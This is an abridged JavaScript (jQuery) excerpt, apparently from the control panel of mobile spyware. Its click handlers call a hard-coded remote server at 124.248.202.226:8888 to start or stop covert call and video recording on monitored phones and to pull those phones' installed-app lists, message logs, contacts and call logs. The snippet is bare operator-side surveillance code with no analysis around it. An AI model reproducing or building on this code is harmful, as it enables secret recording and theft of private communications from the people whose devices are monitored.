$(document).ready(function() {
    ...
    $('#group_type').on('change', function() {
        ...
        location.replace("http://124.248.202.226:8888/manage/device/" + this.value);
    });
    ...
    $("#phonetable").on("click", '#mic_off', function(event) {
        ...
        $.ajax({
            type: "POST",
            url: "http://124.248.202.226:8888/manage/device/callRecord",
            dataType: "json",
    ...
    $("#phonetable").on("click", '#camera_off', function(event) {
        ...
        $.ajax({
            type: "POST",
            url: "http://124.248.202.226:8888/manage/device/videoRecord",
            dataType: "json",
            data: {status: false, device_id: device_id, _token: $('meta[name="csrf-token"]').attr('content')},
            success: function (response) {
                console.log(response);
    ...
    $("#phonetable").on("click", '#device_status', function(event) {
        ...
        $.ajax({
            type: "POST",
            url: "http://124.248.202.226:8888/manage/device/status",
            dataType: "json",
    ...
    $("#phonetable").on("click", '#app_list', function(event) {
        ...
        var device_id = $(this).attr("data-id");
        let endpoint = 'http://124.248.202.226:8888/device/applist/' + device_id;
    ...
    $("#phonetable").on("click", '#msg_log', function(event) {
        ...
        var device_id = $(this).attr("data-id");
        let endpoint = 'http://124.248.202.226:8888/device/msglogs/' + device_id;
    ...
    $("#phonetable").on("click", '#contact_list', function(event) {
        ...
        var device_id = $(this).attr("data-id");
        let endpoint = 'http://124.248.202.226:8888/device/contacts/' + device_id;
    ...
    $("#phonetable").on("click", '#call_log', function(event) {
        ...
        var device_id = $(this).attr("data-id");
        let endpoint = 'http://124.248.202.226:8888/device/calllogs/' + device_id;
